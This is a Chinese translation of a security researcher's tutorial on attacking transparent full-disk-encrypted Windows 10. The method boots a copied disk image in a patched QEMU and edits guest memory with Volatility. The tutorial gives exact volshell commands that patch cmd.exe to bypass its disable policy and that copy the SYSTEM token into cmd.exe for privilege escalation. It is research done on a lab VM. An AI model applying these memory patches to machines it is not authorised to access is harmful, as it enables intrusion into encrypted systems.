> 原文链接: https://www.anquanke.com//post/id/90794 


# 如何使用QEMU和Volatility攻击全盘加密的系统


                                阅读量   
                                **110962**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者diablohorn，文章来源：diablohorn.com
                                <br>原文地址：[https://diablohorn.com/2017/12/12/attacking-encrypted-systems-with-qemu-and-volatility/](https://diablohorn.com/2017/12/12/attacking-encrypted-systems-with-qemu-and-volatility/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01ffc7fd34c0c42e7b.jpg)](https://p1.ssl.qhimg.com/t01ffc7fd34c0c42e7b.jpg)

> 最近，我正在研究如何攻破透明全盘加密（Transparent Full Disk Encryption）的系统。所谓透明全盘加密，是一种加密硬盘的方式，可以在无需用户进行任何操作的情况下启动操作系统。

## 透明全盘加密

为了做到这点，通常会采用下面的方式：

**使用Secure Boot的方式，并且借助TPM封装密钥（推荐）；**

**使用专有的软件，对密钥进行混淆并隐藏（不推荐）；**

**使用外部硬件设备来存储密钥，不使用Secure Boot，不对密钥进行保护（不推荐）。**

在大多数情况下，我们的目标会从预先配置好的应用程序中脱离出来，因此下面这些文章中所讲解的技巧，其实不一定真的管用：

[https://www.trustedsec.com/2015/04/kioskpos-breakout-keys-in-windows/](https://www.trustedsec.com/2015/04/kioskpos-breakout-keys-in-windows/)

[http://carnal0wnage.attackresearch.com/2012/04/privilege-escalation-via-sticky-keys.html](http://carnal0wnage.attackresearch.com/2012/04/privilege-escalation-via-sticky-keys.html)

[https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)

[https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/](https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/)

然而，如果我们获得安全模式（Safe Mode）或启动修复（Startup Repair）的权限，确实会有助于我们对系统的攻击，可以参考下文：

[http://hackingandsecurity.blogspot.nl/2016/03/windows-7-startup-repair-authentication.html](http://hackingandsecurity.blogspot.nl/2016/03/windows-7-startup-repair-authentication.html)

这些方法之所以不太管用，原因在于，我们只能打开一个禁用本地组策略的cmd，因此大部分的选项就都无法使用了。在这里要提到有一个有趣的防范方法，可以使用没有任何功能的可执行文件，去替换explorer.exe。即使我们找到方法，成功攻破了他们的应用，但此时仍然是一无所有的，我们没有桌面，没有开始菜单，也没有图标。有一小部分主机，如果选择“启动修复”选项，就不会对加密盘进行加载，这就导致在我们得到的环境中无法访问目标磁盘。

这时你可能会想到考虑网络攻击的方式，但由于防火墙基于IP、端口和应用，严格限制了出/入通信，并且连接采用了有客户端认证的TLS加密方式，所以无法实现中间人攻击。

我们还可以考虑使用诸如Inception或者Pcileech这些工具，进行直接内存访问（Direct Memory Access，DMA）攻击。然而经过实践，发现一部分系统没有可用的DMA端口，还有一部分系统我没有正确的硬件来执行攻击，因此这个方案也并不可行。

**然而，所有这些加密方案有一个比较普遍的问题，就是很多磁盘加密软件，都没有将加密密钥封装到像TPM这样的硬件安全设备上。这就使得攻击者可以在硬盘上创建一个映像，并且在另一台计算机上以该映像启动。**此外，如果攻击者能够攻破存储加密密钥的位置（例如USB密钥、智能卡、混淆算法、未加密的分区），那么他就可以在不受信任的环境下引导映像，并且完全夺取目标计算机的磁盘控制权限。

**本文将主要讲解当我们引导磁盘映像时可以进行的一些操作。通过本文的分析，希望大家能够更透彻地了解其原理，并且学会一些操作相对便捷、步骤可以理解的解决方案。**

尽管有几种解决方案都能达到相同的目的，但我个人更倾向于轻量级的工具，这样就能很容易地在不同QEMU版本之间移植。此外，你还可以在VMWare中引导映像，这是一种快速粗暴的方法，并且支持挂起计算机、编辑内存文件、恢复计算机的功能。然而，我还是更倾向于QEMU，因为它内置GDB调试，并且支持添加/修改代码后的重新编译，从而让我们能够完全控制整个过程。

如果你想使用这样的工具来分析恶意软件或其他应用，下面的几个工具都采用了QEMU，推荐大家尝试使用：

[pyrebox](https://github.com/Cisco-Talos/pyrebox)（https://github.com/Cisco-Talos/pyrebox）

[rvmi](https://github.com/fireeye/rvmi)（https://github.com/fireeye/rvmi）

[panda](https://github.com/panda-re/panda)（https://github.com/panda-re/panda）

介绍了足够多的背景知识以后，就让我们正式开始攻破系统的尝试。



## 建立模拟环境

因为我暂时没能接触到实际的加固环境，所以我们就首先创建一个模拟的环境。要建立模拟环境，需要：

**Windows 10 x64；**

**VeraCrypt****。**

安装一台64位Windows 10的虚拟机，但不要安装任何虚拟化代理（Virtualisation Agent）。在完成这一步后，我们安装VeraCrypt并对磁盘进行全盘加密。最后，禁用cmd.exe的访问权限。

在这里，假如我们对其他的加固措施也都进行模拟，工作量将会变得巨大，因此我们在这里假设，除了一个禁用的cmd和一个空白桌面以外，没有其他可以利用。



## 创建磁盘映像

在我们开始攻击之前，我们首先需要创建一个磁盘映像。我们有几种方式可以实现此操作：

**从CD/DVD/USB/网络启动；**

**使用磁盘阵列（Disk Enclosure）。**

在我们决定了所使用的方法后，可以使用dd来执行磁盘的实际复制操作。但在这过程中，需要注意避免错误地使用if和of参数。我们理论上也可以引导媒体直接在磁盘上操作，但在实际中不建议这样做。原因在于，一旦我们操作失误，该操作就无法再撤销了。

我建议大家将创建的dd映像作为一个备份，然后再创建一个qcow2格式的新的映像，命令如下：

```
qemu-img convert disk.img -O qcow2 targetdisk.qcow2
```

这样做的好处在于，该格式支持快照，这就使得我们在对它进行操作的时候，能够更容易地在不同工作状态之间进行跳转。



## 分析启动过程

此前，已经有[《Bootloader development environment》](https://diablohorn.com/2010/01/09/bootloader-development-environment/)、[《Debugging an x86 bootloader using qemukvm》](http://blog.oldcomputerjunk.net/2013/debugging-an-x86-bootloader-using-qemukvm/)等多篇文章详细讲解了QEMU或Bochs的使用方法。最重要的一点是，我们需要将-S –s添加到QEMU，使其启动一个GDB服务器，并且立即停止等待连接的状态，如下所示：

```
./x86_64-softmmu/qemu-system-x86_64
-m 1024 -drive file=../targetdisk.qcow2,format=qcow2 -enable-kvm -monitor stdio -show-cursor -cpu core2duo -S -s
```

那么，为什么要调试和分析启动过程呢，原因在于：

**通过该步骤来获得密码（下文将会详细讲解）；**

**寻找密钥派生算法中是否存在漏洞；**

**查找隐藏的信息。**

虽然可能听起来难以置信，但一个全盘加密的产品很容易有上述漏洞。因此，我们对加密软件在早期阶段如何搜索加密数据进行分析，并初始化第一个解密操作，都是很有必要的。

此外，非常多的产品都有隐藏分区，而在隐藏分区中很可能潜藏着丰富的信息，这些信息可能会对我们的工作有所帮助。值得一提的是，当我们在研究透明全盘加密时，我们发现在早期的启动阶段，加密密钥总是会被混淆。



## 关于Guest虚拟内存

经过非常认真的考虑，我选择实时编辑Guest内存的方法，来实现对目标环境的完全控制。

在通常情况下，我们并不能通过QEMU轻易地找到想要的的内存。然而，来宾内存在QEMU进程内部被映射，我们可以通过这种方式来访问它。我们非常希望能通过一种清晰简单的方法，得到一个理想的文件，而Guest内存接口就是一个非常棒的方式。于是，我开始在网上寻找具体实现的方法。最后，我找到了一个[Panda的旧版本](https://github.com/moyix/panda)，这是Brendan Dolan-Gavitt（@moyix）编写的一个非常流行的项目。

该版本有一个为Volatility而设置的接口，会通过UNIX套接字来暴露出完整的Guest内存。经过我们的确认，这个接口不仅提供了读取内存的功能，还提供了写入内存的功能。并且，它是轻量级的，可以在不同版本QEMU中轻易地进行移植。以下是暴露Guest内存所需要进行修改的文件列表：

**Makefile.target**

**hmp-commands.hx**

**memory-access.c**

**memory-access.h**

**monitor.c**

让我们一起看看，如何使用最新版本的QEMU对上述文件进行修改。我常用的方法是，在修改之前，首先确保目标软件可以编译并能够正常工作。我们只需要按照QEMU官网上的[说明](https://www.qemu.org/download/#source)进行操作即可：

```
git
clone git://git.qemu.org/qemu.git

cd
qemu

git
submodule init

git
submodule update --recursive

./configure

make
```

在这里，希望大家能够先认真阅读说明，然后再执行操作。因为该操作将会编译全部内容，需要很长的时间，假如盲目地执行有可能会耗费很多不必要的时间。由于我们只需要x86_64的支持，就可以先确定是否还有其他可用的目标，然后仅对目标进行编译，这样一来就大大缩短了编译的时间：

```
make
help

make
subdir-x86_64-softmmu
```

如果操作全部无误，我们现在应该可以引导此前创建地qcow2映像了，命令如下所示：

```
./x86_64-softmmu/qemu-system-x86_64
-m 1024 -drive file=../targetdisk.qcow2,format=qcow2 -enable-kvm -monitor stdio
-show-cursor -cpu core2duo
```

在上面的命令中，最重要的部分就是-cpu命令，因为QEMU并不是太兼容Win10系统，所以就需要我们来指定一个特定的CPU模型。幸运的是，这是很容易解决的，我们只要去百度Windows中弹出的带有QEMU关键词的错误提示就可以。现在，我们已经掌握了QEMU源编译的方法，而且已经启动了磁盘映像。接下来，就可以着手去获得我们所需的功能。首先，让我们先清理目录，并创建一个单独的分支：

```
make
distclean

git
checkout -b expose-guest-memory
```

其目的在于，假如我们操作失误，那么就可以抛弃掉这个分支，重头来过。我们从Panda项目中复制文件，保存到QEMU分支的根目录下，并且对相关的文件进行编辑。假如你已经知道，面对陌生的代码应该如何操作，你可以跳过下一节的阅读。



## 间奏曲：找到正确的文件并进行修改

现在，我们已经做好了全部准备工作，让我们来看看是否能完成下面两件事：

**重新启用cmd.exe；**

**将cmd.exe提升到系统级。**

首先要提醒大家，据我所知，Volatility并不会在每次读/写操作后实时处理编辑后的内存。其实我认为，实时编辑的方案是完全可行的，但在这里，我们还是采用“暂停VM——编辑内存——恢复VM”的方式。假如我们基于硬件连接，并直接对内存进行攻击时，就没有“暂停”的选项可以使用，这个时候可以进行实时的内存编辑。针对这类情况，应该将本文中的方法，变为类似于初始化的搜索和替换方法。

我遇到过一个有趣的情况，就是当我在连接到实时QEMU内存或者暂停QEMU内存时，Volatility将无法找到KDBG块。如果使用pmemsave命令对内存进行转储（dump），则能够正常工作。解决此问题的方法是，人工指定DTB，这样Volatility就可以执行正确的内存地址转换。如果要获取地址，我们可以在QEMU控制台执行下列命令，并复制CR3的值：

```
info
registers

&lt;snip&gt;

IDT=
fffff80195f6c070 00000fff

CR0=80050031
CR2=0000000000c75000 CR3=00000000001aa000 CR4=000006f8

DR0=0000000000000000
DR1=0000000000000000 DR2=0000000000000000 DR3=0000000000000000

&lt;snip&gt;
```

如果想要列出进程，可以将Volatility的命令行修改成下面的内容：

```
python
vol.py  -f /tmp/expmem --profile=Win10x64_14393 --dtb 0x001aa000 pslist
```



## 重新启用cmd.exe

我们首先需要弄清楚的是：是否有可能改变cmd.exe的执行流，以返回到非阻塞状态。为了解答这个问题，我们先从内存中转储cmd.exe，以确保我们是对完全相同的版本进行操作。在我的自行尝试过程中，就没有注意到这一点，因此我也付出了一些时间上的代价。

我们可以使用procdump来转储cmd.exe，这是一个Volatility的插件，可以将进程转储回可执行文件中：

```
python
vol.py -f /tmp/expmem --profile=Win10x64_14393 --dtb 0x001aa000 procdump -n
'cmd.exe' -D to/
```

现在，我们就有了可执行文件，我们这时就可以使用自己最熟悉的反编译器对其进行反编译，在这里将以IDA为例。此外，radare2或x64dbg也同样有效，但是我们要知道，转储后的可执行文件可能会有一小部分损坏。我们需要关注它的符号关联以及可用性，这样能使逆向工作更加轻松。

在将静态输出与调试版本进行比较后，我们需要弄清楚事实的真相。由于可执行文件并没有被混淆，所以对我们来说，这是一个非常棒的练习机会，我将用不同的方法（静态及调试）来追踪代码：

搜索注册表项“DisableCMD”

搜索名称中带有“exit”的函数；

步进整个执行过程。

这样一来，我们将会进入到如下代码段中：

[![](https://diablohorn.files.wordpress.com/2017/12/cmd_flow.png)](https://diablohorn.files.wordpress.com/2017/12/cmd_flow.png)

在这里，我们可以得到一些经验：

**1. 我们是基于变量，做出的选择；**

**2. 一个好的选择，可以让我们得到可用的Shell；**

**3. 一个坏的选择，导致我们的程序块：**

**(1) 打印出没有用的信息，**

**(2) 暂停并且等待任意键继续，**

**(3) 退出Shell。**

如果我们想要重新启用cmd.exe，那么我们必须将上面的3.2变成2。这一点可以非常容易的完成，只需要跳转到相应的位置就可以。而且，由于在其之后的代码并不重要，所以如果我们需要一些空间，甚至可以将其去掉。要计算跳转（JUMP）的操作码，我们就需要计算mov ecx, esi和xor ecx, ecx地址之间的距离，ecx是一个简单的减操作，我们得到的值是0xB352（十进制的45906）。我们在计算距离后，就可以跳转到后面。在这一步，我尝试寻找简单的方法来生成操作码，最终在这个网站中，我们找到了[一些可以节省编译时间的方法](https://defuse.ca/online-x86-assembler.htm)。

现在，我们就可以将下面内容输入到汇编textbox中，检查x64并且开始汇编：

```
jmp $-45906
```

这就意味着，我们希望从当前的位置向后跳转指定数量的字节。在输出中，甚至提供了一个非常友好的脚本格式：

```
"xE9xA9x4CxFFxFF"
```

现在，让我们用Volatility和Volshell修改内存中的相应位置。

```
python
vol.py -f /tmp/expmem --profile=Win10x64_14393 --dtb 0x001aa000 -w
volshellVolatility Foundation Volatility Framework 2.6

Write
support requested. Please type "Yes, I want to enable write support"
below precisely (case-sensitive):

Yes,
I want to enable write support

Connecting
to: /tmp/expmem

SUCCESS:
Connected to: /tmp/expmem

Current
context: System @ 0xffff80052585d040, pid=4, ppid=0 DTB=0x1aa000

Welcome
to volshell! Current memory image is:

file:///tmp/expmem

To
get help, type 'hh()'
```

如你所见，在这里最重要的标志是-w，如果没有它，我们将无法写入。由于使用的是IDA，我们已经知道了确切的内存位置，所以修改内存就变得非常简单：

```
&gt;&gt;&gt;
cc(name='cmd.exe')

Current
context: cmd.exe @ 0xffff800526cb3800, pid=1912, ppid=2400 DTB=0x3c554000

&gt;&gt;&gt;
proc().get_process_address_space().write(0x7ff6340eac93,'xE9xA9x4CxFFxFF')

True

&gt;&gt;&gt;
dis(0x7ff6340eac93)

0x7ff6340eac93
e9a94cffff JMP 0x7ff6340df941

0x7ff6340eac98
ff DB 0xff

0x7ff6340eac99
ffcc DEC ESP

0x7ff6340eac9b
33c9 XOR ECX, ECX
```

现在，我们可以在QEMU控制台中输入命令c（继续）来恢复VM。当我们命中了cmd.exe中的某个键时，就应该能得到下图这样的可以利用的cmd.exe：

[![](https://p3.ssl.qhimg.com/t01b7cb90256a20342c.png)](https://p3.ssl.qhimg.com/t01b7cb90256a20342c.png)



## 将cmd.exe提升到系统级

我不久前阅读了一篇[很棒的文章](https://blog.xpnsec.com/becoming-system/)，该文章借助WinDBG，展现了在Windows环境下如何进行该操作。接下来，我们试一下能否将相同的技术移植到Volatility中。**事实上，由于Volatility拥有完整的结构，并且它已经对数据进行了分析，所以这一步进行得非常容易，只要有几行Volshell，我们就能将其提升至系统。**

首先，我们从系统进程中获得系统Token：

```
&gt;&gt;&gt; cc(pid=4)

&gt;&gt;&gt; hex(proc().Token.obj_offset)

'0xffff80052585d398L'

&gt;&gt;&gt; db(proc().Token.obj_offset)

0xffff80052585d398 86 59 e1 e3 8d bc ff ff 00 00 00 00 00 00 00 00 .Y..............

0xffff80052585d3a8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
```

在这里，我将实际Token的地址标红，这就是我们将要写入cmd.exe进程中的内容：

```
&gt;&gt;&gt;
cc(name='cmd.exe')

&gt;&gt;&gt;
hex(proc().Token.obj_offset)

'0xffff800526cb3b58L'

&gt;&gt;&gt;
proc().get_process_address_space().write(0xffff800526cb3b58,"x86x59xe1xe3x8dxbcxffxff")

True
```

由此，我们最终得到了所希望的系统级权限：

[![](https://p3.ssl.qhimg.com/t01bdee6fd4cccbe557.png)](https://p3.ssl.qhimg.com/t01bdee6fd4cccbe557.png)



## 总结

加密是一件非常好的安全措施，但它需要正确地应用。我们还需要知道，加密并不是万能的。当你下次遇到加密的系统时，我希望你不要放弃，开始研究加密是如何应用的，以及是否有变通的方法实现攻击。本文所涉及到的文件请在[这里](https://gist.github.com/DiabloHorn/d0d9745f053412ed672645e127e7301e)查看，但是如果你的QEMU版本不同，你可能需要对它们进行适当的修改，或者也可以考虑使用[原始的Panda git](https://github.com/moyix/panda)。
